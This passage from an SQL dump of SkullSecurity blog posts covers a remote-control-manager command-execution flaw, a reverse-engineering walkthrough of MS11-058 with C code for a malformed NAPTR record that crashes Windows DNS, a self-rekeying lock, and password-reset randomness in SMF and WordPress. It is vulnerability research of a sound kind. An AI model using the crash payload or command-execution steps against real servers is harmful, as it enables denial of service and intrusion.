1234\r\n192.168.1.112: inverse host lookup failed: \r\n(UNKNOWN) [192.168.1.112] 1234 (?) open\r\n sent 60, rcvd 1\r\n\nAnd check the file:\n\nYup, works like a charm! (Don\'t mind the bad ip address - I took some of these screenshots at different times than others)\nI change the code a little bit to point to the Web root and give it a go, and sure enough it works. With that, I can now write a proper check for Nessus. And with that, I\'m done. \nSummary\nSo, the TL;DR version of this is:\n\nConnect to the host\nSend it a port number, following by a null byte (\"\\0\") - the host will try to connect back on that port\nSend a username and a password, each terminated by a null byte - these will be ignored\nSend a command using the \"runasuser.exe\" program - included\nProfit!', '\'Hacking\', \'Reverse Engineering\'', 'https://blog.skullsecurity.org/2011/remote-control-manager-fail');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (43, 'A deeper look at ms11-058', 'Ron Bowes', '2011-8-23', 'Hey everybody,\nTwo weeks ago today, Microsoft released a bunch of bulletins for Patch Tuesday. One of them - ms11-058 - was rated critical and potentially exploitable. However, according to Microsoft, this is a simple integer overflow, leading to a huge memcpy leading to a DoS and nothing more. I disagree. \nAlthough I didn\'t find a way to exploit this vulnerability, there\'s more to this vulnerability than meets the eye - it\'s fairly complicated, and there are a number of places that I suspect an experienced exploit developer might find a way to take control. \nIn this post, I\'m going to go over step by step how I reverse engineered this patch, figured out how this could be attacked, and why I don\'t believe the vulnerability is as simple as the reports seem to indicate. \nOh, and before I forget, the Nessus Security Scanner from Tenable Network Security (my employer) has both remote and local checks for this vulnerability, so if you want to check your network go run Nessus now!\n\nThe patch\nThe patch for ms11-058 actually covers two vulnerabilities:\n\nAn uninitialized-memory denial-of-service vulnerability that affects Windows Server 2003 and Windows Server 2008\nA heap overflow in NAPTR records that affects Windows Server 2008 only\n\nWe\'re only interested in the second vulnerability. I haven\'t researched the first at all. \nThankfully, the Microsoft writeup went into decent detail on how to exploit this issue. The vulnerability is actually triggered when a host parses a response NAPTR packet, which means that a vulnerable host has to make a request against a malicious server. Fortunately, due to the nature of the DNS protocol, that isn\'t difficult. For more details, check out that Microsoft article or read up on DNS. But, suffice it to say, we can easily make a server into processing our records! \nNAPTR records\nBefore I get going, let\'s stop for a minute and look at NAPTR records. \nNAPTR (or Naming Authority Pointer) records are designed for some sorta service discovery. They\'re defined in RFC2915, which is fairly short for a RFC. But I don\'t recommend reading it - I did, and it\'s pretty boring.  In spite of my reading, I still don\'t understand exactly what NAPTR records really do. They seem to be used frequently for SIP and related protocols, though.\nWhat matters is, the format of a NAPTR resource record is:\n\n(domain-name) question\n(int16) record type\n(int16) record class\n(int32) time to live\n(int16) length of NAPTR record (the rest of this structure)\n(int16) order\n(int16) preference\n(character-string) flags\n(character-string) service\n(character-string) regex\n(domain-name) replacement\n\n(A resource record, for those of you who aren\'t familiar with DNS, is part of a DNS packet. A dns \"answer\" packet contains one or more resource records, and each resource record has a type - A, AAAA, CNAME, MX, NAPTR, etc. Read up on DNS for more information.)\nThe first four fields in the NAPTR record are common to all resource records in DNS. Starting at the length, the rest are specific to NAPTR and the last four are the interesting ones. The (character-string) and (domain-name) types are defined in RFC1035, which I don\'t recommend reading either. The important part is:\n\nA (character string) is a one-byte length followed by up to 255 characters - essentially, a length-prefixed string\nA (domain name) is a series of character strings, terminated by an empty character string (simply a length of \\x00 and no data - effectively a null terminator)\n\nRemember those definitions - they\'re going to be important. \nYou will need...\nAll right, if you plan to follow along, you\'re going to definitely need the vulnerable version of dns.exe. Grab c:\\windows\\system32\\dns.exe off an unpatched Windows Server 2008 x86 (32-bit) host. If you want to take a look at the patched version, grab the executable from a patched host. I usually name them something obvious:\n\nRight-click on the files and select \'properties\' and pick the \'details\' tab to ensure you\'re working from the same version as me:\n\nYou will also need IDA, Patchdiff2, and Windbg. And a Windows Server 2008 32-bit box with DNS installed and recursion enabled. If you want to get all that going, you\'re on your own. :)\nYou\'ll also need a NAPTR server. You can use my nbtool program for that - see below for instructions. \nDisassemble\nLoad up both files in their own instances of IDA, hit \'Ok\' or \'Next\' until it disassembles them, and press \'space\' when the graph view comes up to go back to the list view. Then close and save the patched one. In the vulnerable version, run patchdiff2:\n\nAnd pick the .idb file belonging to the patched version of dns.exe. After processing, you should get output something like this:\n\nThere are two things to note here. First, at the bottom, in the status pane, you get a listing of the functions that are \"identical\", matched, and unmatched. Identical functions are ones that patchdiff2 has decided are unchanged (even when that\'s not true, as we\'ll see shortly); matched functions are ones that patchdiff2 thinks are the same function in both files, but have changed in a significant way; and unmatched functions are ones that patchdiff2 can\'t find a match for. \nYou\'ll see that in ms11-058, it found 1611 identical functions and that\'s it. Oops?\nIf you take a look at the top half of the image, it\'s a listing of the identical functions. I sorted it by the CRC column, which prints a \'+\' when the CRC of the patched and unpatched versions of a function differ. And look at that - there are four not-so-identical functions! \nThe obvious function in this bunch to take a closer look at is NaptrWireRead(). Why? Because we know the vulnerability is in NAPTR records, so it\'s a sensible choice! \nAt this point, I closed IDA and re-opened the .exe files rather than leaving patchdiff2 running. \nSo, go ahead now and bring up NaptrWireRead() in both the unpatched and patched versions. You can use shift-F4 to bring up the \'Names\' window and find it there. It should look like this:\n\nScroll around and see you can see where these functions vary. It\'s not as easy as you\'d think! There\'s only one line different, and I actually missed it the first time:\n\nLine 0x01038b38 and 0x01038bd8 are different! One uses movsx and one uses movzx. Hmm! What\'s that mean?\nmovsx means \"move this byte value into this dword value, and extend the sign\". movzx means \"move this byte value into this dword value, and ignore the sign\". Basically, a signed vs unsigned value. For the bytes 0x00 to 0x7F, this doesn\'t matter. For 0x80 to 0xFF, it matters a lot. That can be demonstrated by the following operation:\nmovsx edi, 0x7F\r\nmovsx esi, 0x80\r\n\r\nmovzx edi, 0x7F\r\nmovzx esi, 0x80\nIn the first part, you\'ll end up with edi = 0x0000007F, as expected, but esi will be 0xFFFFFF80. In the second part, esi will be 0x0000007F and edi will be 0x00000080. Why? For more information, look up \"two\'s complement\" on Wikipedia. But the simple answer is, 0x80 is the signed value of -128 and the unsigned value of 128. 0xFFFFFF80 is also -128 (signed), and 0x00000080 is 128 (unsigned). So if 0x80 is signed, it takes the 32-bit signed value (-128 = 0xFFFFFF80); if 0x80 is unsigned, it takes the 32-bit unsigned value (128 = 0x00000080). Hopefully that makes a little sense! \nSetting up and testing NAPTR\nMoving on, we want to do some testing. I set up a fake NAPTR server and I set up the Windows Server to recurse to my fake NAPTR server. If you want to do that yourself, one way is grab the sourcecode for nbtool and apply this patch. You\'ll have to fiddle in the sourcecode, though, and it may be a little tricky.  \nYou can also use any DNS server that allows a NAPTR record. We aren\'t actually sending anything broken, so any DNS server you know how to set up should work just fine. \nBasically, I use the following code to build the NAPTR resource record:\n\r\nchar *flags   = \"flags\";\r\nchar *service  = \"service\";\r\nchar *regex   = \"this is a really really long but still technically valid regex\";\r\nchar *replace = \"this.is.the.replacement.com\";\r\n\r\n\r\nanswer = buffer_create(BO_BIG_ENDIAN);\r\nbuffer_add_dns_name(answer, this_question.name); /* Question. */\r\n\r\nbuffer_add_int16(answer, DNS_TYPE_NAPTR); /* Type. */\r\nbuffer_add_int16(answer, this_question.class); /* Class. */\r\nbuffer_add_int32(answer, settings->TTL);\r\nbuffer_add_int16(answer, 2 +                   /* Length. */\r\n                         2 +\r\n                         1 + strlen(flags) +\r\n                         1 + strlen(service) +\r\n                         1 + strlen(regex) +\r\n                         2 + strlen(replace));\r\n\r\nbuffer_add_int16(answer, 0x0064); /* Order. */\r\nbuffer_add_int16(answer, 0x000b); /* Preference. */\r\n\r\nbuffer_add_int8(answer, strlen(flags)); /* Flags. */\r\nbuffer_add_string(answer, flags);\r\n\r\nbuffer_add_int8(answer, strlen(service)); /* Service. */\r\nbuffer_add_string(answer, service);\r\n\r\nbuffer_add_int8(answer, strlen(regex)); /* Regex. */\r\nbuffer_add_string(answer, regex);\r\n\r\nbuffer_add_dns_name(answer, replace);\r\nanswer_string = buffer_create_string_and_destroy(answer, &answer_length);\r\n\r\ndns_add_answer_RAW(response, answer_string, answer_length);\r\n\nIt\'s not pretty, but it did the trick. After that, I compile it and run it. At this point, it\'ll simply start a server that waits for NAPTR requests and respond with a static packet no matter what the request was. \nDebugger\nNow, we fire up Windbg. If you ever use Windbg for debugging, make sure you check out Windbg.info - it\'s an amazing resource. \nWhen Windbg loads, we hit F6 (or go to file->attach to process). We find dns.exe in the list and select it:\n\nOnce that\'s fired up, I run !peb to get the base address of the process (there are, of course, other ways to do this). The command should look like this:\n\nBack in IDA, rebase the program by using edit->segments->rebase program, and set the image base address to 0x00ea0000:\n\n\nThis way, the addresses in Windbg and IDA will match up properly. Now, go back to that movsx we were looking at earlier - it should now be at 0x00ed8b38 in the vulnerable version. Throw a breakpoint on that address in Windbg with \'bp\' and start the process with \'g\' (or press F5):\n\r\n  > bp ed8b38\r\n  > g\r\n\nThen perform a lookup on the target server (in my case I\'m doing this from a Linux host using the dig command, and my vulnerable DNS server is at 192.168.1.104):\n\r\n  $ dig @192.168.1.104 -t NAPTR +time=60 test.com\r\n\n(the +time=60 ensures that it doesn\'t time out right away)\nIn Windbg, the breakpoint should fire:\n\nNow, recall that the vulnerable command is this:\n\r\n  movsx edi, byte ptr [ebx]\r\n\nSo we\'d naturally like to find out what\'s in ebx. We do this with the windbg command \'db ebx\' (meaning display bytes at ebx):\n\nBeautiful! ebx points to the length byte for \'flags\'. In our case, we set the flags to the string \'flags\', which is represented as the character string \"\\x05flags\" (where \"\\x05\" is the byte \'5\', the string\'s size). If we hit \'g\' or press \'F5\' again, it\'ll break a second time. This time, if you run \'db ebx\' you\'ll see it sitting on \"\\x07service\". If you hit F5 again, not surprisingly, you\'ll end up on \"\\x3ethis is a really really long ...\". And finally, if you hit F5 one more time, the program will keep running and, if you did this in under 60 seconds, dig will get its response.\nSo what have we learned? The vulnerable call to movsx happens three times - on the one-byte size values of flags, service, and regex. \nLet\'s break something!\nAll right, now that we know what\'s going on, this should be pretty easy to break! Yay! Let\'s try sending it a string that\'s over 0x80 bytes long:\n\r\n        char *flags   = \"AAAAAAAAAAAAAAAA\"\r\n                        \"AAAAAAAAAAAAAAAA\"\r\n                        \"AAAAAAAAAAAAAAAA\"\r\n                        \"AAAAAAAAAAAAAAAA\"\r\n                        \"AAAAAAAAAAAAAAAA\"\r\n                        \"AAAAAAAAAAAAAAAA\"\r\n                        \"AAAAAAAAAAAAAAAA\"\r\n                        \"AAAAAAAAAAAAAAAA\"\r\n                        \"AAAAAAAAAAAAAAAA\";\r\n        char *service  = \"service\";\r\n        char *regex   = \"regex\";\r\n        char *replace = \"my.test.com\";\r\n\r\n\nThen compile it, start the service again, and send our NAPTR lookup with dig, exactly as before. Don\'t forget to clear your breakpoints in Windbg, too, using \'bc *\' (breakpoint clear, all). \nAfter the lookup, the dns.exe service should crash:\n\nWoohoo! It crashed in a \'rep movs\' call, which is in memcpy(). No surprise there, since we were expecting to pass a huge integer (0x90 became 0xFFFFFF90, which is around 4.2 billion) to a memcpy function. \nIf we check out edi (the destination of the copy), we\'ll find it\'s unallocated memory, which is what caused the crash. If we check out ecx, the size of the copy, we\'ll see that it\'s 0x3fffff6e - way too big:\n \nRestart the DNS service, re-attach the debugger, and let\'s move on to something interesting... \nThe good part\nNow we can crash the process. Kinda cool, but whatever. This is as far as others investigating this issue seemed to go. But, they missed something very important:\n\nSee there? Line 0x00ed8b3b? lea eax, [edi + 1]. edi is the size, and eax is the value passed to memcpy. See what\'s happening? It\'s adding 1 to the size! That means that if we pass a size of 0xFF (\"-1\" represented as one byte), it\'ll get extended to 0xFFFFFFFF (\"-1\" represented as 4 bytes), and then, on that line, eax becomes -1 + 1, or 0. Then the memcpy copies 0 bytes. \nThat\'s great, but what\'s that mean?\nLet\'s reconfigure out NAPTR server again to return exactly 0xFF bytes:\n\r\n        char *flags   = \"QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\"\r\n                        \"QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\"\r\n                        \"QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\"\r\n                        \"QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\"\r\n                        \"QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\"\r\n                        \"QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\"\r\n                        \"QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\"\r\n                        \"QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\";\r\n        char *service  = \"service\";\r\n        char *regex   = \"regex\";\r\n        char *replace = \"my.test.com\";\r\n\r\n\nThen run it as before. This time, when we do our dig, the server doesn\'t crash! Instead, we get a weird response:\n\nWe get an answer back, but not a valid NAPTR answer! The answer has the flags of \"\\x03\\x02my\\x04test\\x03com\", but no service, regex, or replace. Weird! \nNow, at this point, we have enough for a vulnerability check, but I wanted to go further, and to find out how exactly this was returning such a weird result (and, more importantly, whether we can assume that it\'ll be consistent)! \nSo, let\'s take a look at the vulnerable code again. Go back to NaptrPtrRead() and find the vulnerable movsx:\n\nYou can quickly see that this is a simple loop. var_10C is a counter set to 3, the size at [ebx] (the length of the flags) is read, that many bytes is copied from ebx (the incoming packet) to esi (the place where the answer is stored). Then the counter is decremented, and both the source and destination are moved forward by that many bytes plus one (for the length), and it repeats twice - once for service, and once for regex. \nIf we set the length of flags to 0xFF, then 0 bytes are copied and the source and destination don\'t change. So esi, the answer, remains an empty buffer. \nJust below that, you\'ll see this:\n\nThe source and destination are the same as before, and they call a function called _Name_CopyCountName(). That\'s actually a fairly complicated function, and I didn\'t reverse it much. I just observed how it worked. One thing that was obvious is that it read the fourth and final string in the NAPTR record - the one called \"replacement\", which is a domain name rather than a length-prefixed string like the rest. \nEssentially, it\'d set esi to a string that looked like this:\n\nthe 0x0d at the start is obviously the length of the string; the 0x03 following is the number of fields coming (\"my\", \"test\", and \"com\" = 3 fields), and the rest of the string is the domain name formatted as it usually is - the size of each field followed by the field. \nAnother interesting note is, this is the exact value that the DNS request got earlier (minus the 0x0d at the start) - \"\\x03\\x02my\\x04test\\x03com\"! \nAt this point, I understood exactly what was happening. As we\'ve seen, there are supposed to be four strings - flags, service, regex, and replacement. The first three are (character-string) values, and are all read the same way. The last one is a (domain-name) value, and is read using _Name_CopyCountName(). \nWhen we send a length of 0xFF, the first three strings don\'t get read - the buffer stays blank - and only the domain name is processed properly. Then, later, when the strings are sent back to the server, it expects the \'flags\' value to be the first value in the buffer, but, because it read 0 bytes for flags, it skips flags and reads the \'replacement\' value - the (domain-name) - as if it were flags. That gets returned and it reads the \'service\', the \'regex\', and the \'replacement\' fields - all of which are blank. \nThe response is sent to the server with the \'flags\' value set to the \'replacement\' and everything else set to blank. Done?\nThe plot thickens\nI thought I understood this vulnerability completely now. It was interesting, fairly trivial to check for, and impossible to exploit (beyond a denial of service). The perfect vulnerability! I wrote the Nessus check and tested it again Windows 2008 x86, Windows 2008 x64, and Windows 2008 R2 x64. Against Windows 2008 x64, the result was different - it was \"\\x03\\x02my\\x04test\\x03com\\x00\\x00\\x00\\x00\". That was weird. I tried changing the domain name from \"my.test.com\" to \"my.test.com.a\". It returned the string I expected. Then I set it to \"my.test.com.a.b.c\", and it returned a big block of memory including disk information (the drive c: label). Wtf? I tried a few more domain names, and none of them, including \"my.test.com.a.b.c\", returned anything unusual. I couldn\'t replicate it! Now I *knew* that something was up! \nTo demonstrate this reliably, I can set the \'replacement\' value of the response to \'my.test.com.aaaaaaaaaaaaa\' and get the proper response:\n\nAnd then set it to \'my.test.com.aaaaaaa\' and get a weird response:\n\nRather than just the simple string we usually get back, we got the simple string, the 7 \'a\' bytes that we added, then a null, then 11 more \'a\' values and 0x59 \"\\x00\" bytes. So, that\'s proof that something strange is happening, but what?\nThe investigation\nIf you head back to the NaprWireRead function and go to line 0xed8b61, you\'ll see the call to _Name_CopyCountName():\n\nThat\'s where the string is copied into the buffer - esi. What we want to do is track down where that value is read back out of the buffer, because there\'s obviously something gone amiss there. So, we put a breakpoint at 0xed8b66 - the line after the name is copied to memory - using the \'bp\' command in Windbg:\n\nThen we run it, and make a NAPTR request. It doesn\'t matter what the request is, this time - we just want to find out where the message is read. When it breaks, as shown above, we check what the value at esi is. As expected, it\'s the encoded \'replacement\' string - the length, the number of fields, and the replacement (domain-name) value. \nWe run \'ba r4 esi\' - this sets a breakpoint on access when esi (or the three bytes after esi) are read. Then we use \'g\' or \'F5\' to start the process once again. \nImmediately, it\'ll break again - this time, at 0xed5935 - in NaptrWireWrite()! Since the packet is read in NaptrWireRead(), it makes sense that it\'s sent back out in NaptrWireWrite. Awesome! \nThe code powering NaptrWireWrite() is actually really simple. This is all the relevant code (don\'t worry too much about the colours - I just like colouring code as I figure things out :) ):\n\nHere, it reads the length of the first field from [esi] - which, in our \'attack\', is the length of the \'replacement\' value, not the flags value like it ought to be. It uses memcpy to copy that into a buffer, using the user-controlled length. then it loops. The second time, it\'s going to read the null byte (\\x00) that\'s immediately after the \'replacement\' value. The third time, it\'s going to read the byte following that null byte. What\'s there? We\'ll get to that in a second. \nThen, after it loops three times, it calls _Name_WriteCountNameToPacketEx(), passing it the remainder of the buffer. Again, what\'s that value?\nLet\'s stick a breakpoint on 0xed5935 - the memcpy - and see what the three values are. First, for \'my.test.com.aaaaaaa\':\n\nAs we can see, the first field is, as expected, the \'replacement\' value - my.test.com.aaaaaaaaaaa. The second value is blank, and the third value is blank. The result is going to be the usual \"\\x03\\x02my\\x04test\\x03com\". No problem! Now let\'s do a lookup for \"my.test.com.a\":\n\nThe first one is, as usual, the \'replacement\' value. The second memcpy starts with the 0x00 byte at the end, and copies 0 bytes. But the third one starts on 0x61 - that\'s one of the \'a\' values from the previous packet! - and copies 0x61 bytes into the buffer. Then _Name_WriteCountNameToPacketEx() is called 0x61 bytes after on whatever happens to be there. \nWhat\'s it all mean?\nWhat\'s this mean? And why should we care?\nWell, it turns out that this vulnerability, in spite of its original innocuous appearance, is actually very interesting. We can pass 100% user-controlled values into memcpy - unfortunately, it\'s a one-byte size value. Additionally, we can pass 100% user-controlled values into a complicated function that does a bunch of pointer arithmatic - _Name_WriteCountNameToPacketEx()! I reversed that full function, but I couldn\'t see any obvious points where I could gain control. \nGiven enough time and thought, though, I\'m reasonably confident that you can turn this into a standard heap overflow. A heap overflow on Windows 2008 would be difficult to exploit, though. But there are some other quirks that may help - _Name_WriteCountNameToPacketEx() does some interesting operations, like collapsing matching domain names into pointers - \'c0 0c\' will look familiar if you\'ve ever worked with DNS before. \nSo, is this exploitable? I\'m not sure. Is it definitely NOT exploitable? I wouldn\'t say so. When you can start passing user-controlled values into functions that expect tightly-controlled pointer values, that\'s when the fun starts. :)\nConclusion\nI hope you were able to follow along, and I hope that the real exploit devs out there read this and can take it a step further. I\'d be very interested in whether this vulnerability can be taken to the next level!', '\'DNS\', \'Hacking\', \'Reverse Engineering\'', 'https://blog.skullsecurity.org/2011/a-deeper-look-at-ms11-058');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (44, 'Locks that can re-key themselves?', 'Ron Bowes', '2011-4-20', 'Hey everybody,\nAs I\'m sure you all know, I normally post about IT security here. But, once in awhile, I like to take a look at physical security, even if it\'s just in jest. \nWell, this time it isn\'t in jest. I was at Rona last week buying a lead/asbestos/mold-rated respirator (don\'t ask!), when I took a walk down the lock aisle. I\'m tired of all my practice locks and was thinking of picking up something interesting. Then I saw it: a lock that advertised that it could re-key itself to any key. Woah! I had to play with it. \nNow, maybe I\'m an idiot (in fact, my best friends would swear it). But I hadn\'t ever heard of a lock that can do that before! So I did the obvious thing: I bought it, took it apart, figured out how it worked, then took pictures of everything.\n\nHow it\'s used\nSo, in normal use, this is what you do. \nWhen you take it out of the package, it looks like a normal lock with an extra little hole in the side:\n\nYou stick in the proper key, turn it a 1/4 turn (so the key is horizontal), as shown here:\n\nThen, in the little hole, you use the special \"re-key\" tool that it comes with:\n\nOnce the tool\'s been inserted, you can pull out the key:\n\nAt this point, the lock is in \"re-key mode\". I\'ll talk about how it works later, but you can now insert any key that matches the warding:\n\nTurn it back to the original position:\n\nAnd remove it:\n\nCongratulations! The lock is now keyed to the new key instead of the old key. How the hell did that happen!?\nVocabulary\nJust some quick definitions to help you follow (I\'m stealing phrases from normal locks that shouldn\'t really apply to this one, but it\'s convenient):\nKey pins are the pins that touch the key\nDriver pins are the pins (in this case, with a saw-tooth) that don\'t touch the key\nKey cylinder is the half of the cylinder that you insert the key into (and that houses the key pins)\nLoose cylinder is the other half of the cylinder that I couldn\'t think of a good name for\nThe bar is an oddly shaped metal bar that fits into the loose cylinder. \nHow it works\nNaturally, the next thing I did was take the lock apart. As soon as I removed a couple bits that held it together, the whole cylinder slid out, fell on my desk, and all the little pieces went everywhere. An hour later, I got it re-assembled and working again, and this is what it looked like:\n\nDon\'t forget, you can click on the pictures for a bigger version! \nAnyway, there are actually two half-cylinders (that I\'m calling the key cylinder and the loose cylinder) held together by simply being in the lock, plus the bar across the back of one, 5 loose driver pins on the inside, and 5 key pins that can\'t easily be removed. \n\nIn that picture, there are two important details that I called out. First, the slot in the bottom of the loose cylinder fits into the \'- - - - -\' on the key cylinder. Second, the jagged part of the driver pins fits on a little hook on the key pins. Those two facts are important both for the re-key and the locking. \nHere\'s a closeup of what I\'m calling the driver pins:\n\nNote that they have two grooves, one on the front and one on the back (for the purposes of the narrative, the front is on the right). The groove on the front, as we saw earlier, fits into the \'- - - - -\' pattern on the key cylinder. The groove on the back fits into the bar, shown above, that goes onto the back of the loose cylinder. \nRe-keying\nSo let\'s look at how the re-key mechanism work! \nFirst, recall that the driver pins have a groove that fits into a \'- - - - -\' on the lock:\n\nIn normal use, these pins freely move up and down beside the \'-\' marks. They\'re pulled up and down by the little hooks on the key pins. When the proper key is inserted, the grooves on all five pins will line up with (but DON\'T hook onto) the five \'-\' marks:\n\nThen the re-key tool is inserted:\n\nThis slides the groove on the driver pins onto the \'-\' marks. Not that this cannot happen if the key is the wrong one. That\'s an important part of the security. Here\'s what it looks like if the loose cylinder is removed (I only did two pins because setting this up is like balancing a coin on its side):\n\nWhen you remove the key, the driver pins will rest in the \"good\" position - that is, in the position that lets the cylinder rotate and that lets it be re-keyed - thanks to the grooves they\'re now sitting on. The key pins, which are no longer hooked on the driver pins, will return to their original positions. \nWhen you insert a new key, the key pins will return to a new position while the driver pins are still in the \"good\" position (that lets you re-key/unlock). \nWhen you turn the key back, the driver pins will come off the \'-\' marks and wind up back on the key pins\' grooves. But the location of the driver pins has changed - the key that lines up all the grooves is now the new key, not the old one! \nThis design is, in my opinion, brilliant! It\'s pretty straight forward, now, to see how it locks. \nLocking\nNow that we know how the pins work, as I said, the locking is actually pretty straight forward. Remember that bar along the back of the removable cylinder we saw earlier?\n\nWell, that\'s the key (ha!) to this whole thing. \nBasically, when no key or the wrong key is inserted, it stays locked in position jutting out from the cylinder:\n\nWhen the proper key is inserted, it can be pushed back in:\n\nThis is because of the groove on the backs of the pins. The bar rests on the pins but can only be pushed in when the five grooves of the five pins are in the proper place. \nAnd that\'s it! \nSecurity\nBased on what I\'ve seen, it appears that these locks can likely be picked in two different ways. The standard way, using a tension wrench, has several issues:\n\nIt\'s difficult to get the pick into the keyway due to the warding\nEvery pin is grooved along the back so it sets improperly all over the place\nBecause the key pins pull up the driver pins, you don\'t get the same feeling when the pins are setting\n\nI had another idea for picking, though, that I don\'t have the right tool to accomplish. The standard way is to turn the cylinder and rely on it causing the bar along the back to put pressure on the pins, but the pins have a sawtooth along the back to set falsely. That\'s difficult. However, if we put tension on the re-key hole, then we\'re pushing the pins towards the back of the lock onto the \'- - - - -\' lines. There\'s no security on the sides of the pin, so, in theory, it should pick a whole lot easier. And, once you\'ve picked it, you\'ll be able to re-key and never pick it again. BAM! \nUnfortunately, you need a thin tool that can maintain a constant pressure, and I can\'t think of anything like that. Any ideas?\nHope you enjoyed this somewhat non-standard posting!', '\'Reverse Engineering\'', 'https://blog.skullsecurity.org/2011/locks-that-can-re-key-themselves');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (45, '(Mostly) good password resets', 'Ron Bowes', '2011-3-24', 'Hey everybody!\nThis is part 3 to my 2-part series on password reset attacks (Part 1 / Part 2). Overall, I got awesome feedback on the first two parts, but I got the same question over and over: what\'s the RIGHT way to do this?\nSo, here\'s the thing. I like to break stuff, but I generally leave the fixing to somebody else. It\'s just safer that way, since I\'m not really a developer or anything like that.  Instead, I\'m going to continue the trend of looking at others\' implementations by looking at three major opensource projects - WordPress, SMF, and MediaWiki. Then, since all of these rely on PHP\'s random number implementation to some extent, I\'ll take a brief look at PHP.\n\nSMF\nSMF 1.1.13 implements the password-reset function in Sources/Subs-Auth.php:\n\r\n  // Generate a random password.\r\n  require_once($sourcedir . \'/Subs-Members.php\');\r\n  $newPassword = generateValidationCode();\r\n  $newPassword_sha1 = sha1(strtolower($user) . $newPassword);\nLooking at Sources/Subs-Members.php, we find:\n\r\n// Generate a random validation code.\r\nfunction generateValidationCode()\r\n{\r\n  global $modSettings;\r\n\r\n  $request = db_query(\'\r\n    SELECT RAND()\', __FILE__, __LINE__);\r\n\r\n  list ($dbRand) = mysql_fetch_row($request);\r\n  mysql_free_result($request);\r\n\r\n  return substr(preg_replace(\'/\\W/\', \'\', sha1(microtime() . mt_rand() . $dbRand .\r\n      $modSettings[\'rand_seed\'])), 0, 10);\r\n}\r\n\nWhich is pretty straight forward, but also, in my opinion, very strong. It takes entropy from a bunch of different places:\n\nThe current time (microtime())\nPHP\'s random number generator (mt_rand())\nMySQL\'s random number generator ($dbRand)\nA user-configurable random seed\n\nEssentially, it puts these difficult-to-guess values through a cryptographically secure function, sha1(), and takes the first 10 characters of the hash. \nThe hash consists of lowercase letters and numbers, which means there are 36 possible choices for 10 characters, for a total of 3610 or 3,656,158,440,062,976 possible outputs. That isn\'t as strong as it *could* be, since there\'s no reason to limit its length to 10 characters (or its character set to 36 characters). That being said, three quadrillion different passwords would be nearly impossible to guess. (By my math, exhaustively cracking all possible passwords, assuming md5 cracks at 5 million guesses/second, would take about 23 CPU-years). Not that cracking is terribly useful - remote bruteforce guessing is much more useful and is clearly impossible.\nSMF is my favourite implementation of the three, but let\'s take a look at WordPress!\nWordPress\nWordPress 3.1 implements the password-reset function in wp-login.php:\n\r\n  $key = $wpdb->get_var($wpdb->prepare(\"SELECT user_activation_key FROM\r\n      $wpdb->users WHERE user_login = %s\", $user_login));\r\n  if ( empty($key) ) {\r\n    // Generate something random for a key...\r\n    $key = wp_generate_password(20, false);\r\n    do_action(\'retrieve_password_key\', $user_login, $key);\r\n    // Now insert the new md5 key into the db\r\n    $wpdb->update($wpdb->users, array(\'user_activation_key\' => $key), \r\n      array(\'user_login\' => $user_login));\r\n  }\r\n\nwp_generate_password() is found in wp-includes/pluggable.php:\n\r\n/**\r\n * Generates a random password drawn from the defined set of characters.\r\n *\r\n * @since 2.5\r\n *\r\n * @param int $length The length of password to generate\r\n * @param bool $special_chars Whether to include standard special characters.\r\n      Default true.\r\n * @param bool $extra_special_chars Whether to include other special characters.\r\n *   Used when generating secret keys and salts. Default false.\r\n * @return string The random password\r\n **/\r\nfunction wp_generate_password( $length = 12, $special_chars = true, $\r\n      extra_special_chars = false ) {\r\n  $chars = \'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\';\r\n  if ( $special_chars )\r\n    $chars .= \'!@#$%^&*()\';\r\n  if ( $extra_special_chars )\r\n    $chars .= \'-_ []{}<>~`+=,.;:/?|\';\r\n\r\n  $password = \'\';\r\n  for ( $i = 0; $i < $length; $i++ ) {\r\n    $password .= substr($chars, wp_rand(0, strlen($chars) - 1), 1);\r\n  }\r\n\r\n  // random_password filter was previously in random_password function which was\r\n      deprecated\r\n  return apply_filters(\'random_password\', $password);\r\n}\r\n\nThis generates a string of random characters (and possibly symbols) up to a defined length, choosing the characters using wp_rand(). So, for the final step, how is wp_rand() implemented? It\'s also found in wp-includes/pluggable.php and looks like this:\n\r\n  global $rnd_value;\r\n\r\n  // Reset $rnd_value after 14 uses\r\n  // 32(md5) + 40(sha1) + 40(sha1) / 8 = 14 random numbers from $rnd_value\r\n  if ( strlen($rnd_value) < 8 ) {\r\n    if ( defined( \'WP_SETUP_CONFIG\' ) )\r\n      static $seed = \'\';\r\n    else\r\n      $seed = get_transient(\'random_seed\');\r\n    $rnd_value = md5( uniqid(microtime() . mt_rand(), true ) . $seed );\r\n    $rnd_value .= sha1($rnd_value);\r\n    $rnd_value .= sha1($rnd_value . $seed);\r\n    $seed = md5($seed . $rnd_value);\r\n    if ( ! defined( \'WP_SETUP_CONFIG\' ) )\r\n      set_transient(\'random_seed\', $seed);\r\n  }\r\n\r\n  // Take the first 8 digits for our value\r\n  $value = substr($rnd_value, 0, 8);\r\n\r\n  // Strip the first eight, leaving the remainder for the next call to wp_rand().\r\n  $rnd_value = substr($rnd_value, 8);\r\n\r\n  $value = abs(hexdec($value));\r\n\r\n  // Reduce the value to be within the min - max range\r\n  // 4294967295 = 0xffffffff = max random number\r\n  if ( $max != 0 )\r\n    $value = $min + (($max - $min + 1) * ($value / (4294967295 + 1)));\r\n\r\n  return abs(intval($value));\r\n}\r\n\nThis is quite complex for generating a number! But the points of interest are:\n\nHashing functions (sha1 and md5) are used, which are going to be a lot slower than a standard generator, but they, at least in theory, have cryptographic strength\nThe random number is seeded with microtime() and mt_rand(), which is PHP\'s \"advanced\" randomization function)\nThe random number is restricted to 0 - 0xFFFFFFFF, which is pretty typical\n\nIn practice, due to the multiple seeds with difficult-to-predict values and the use of a hashing function to generate strong random numbers, this seems to be a good implementation of a password reset. My biggest concern is the complexity - using 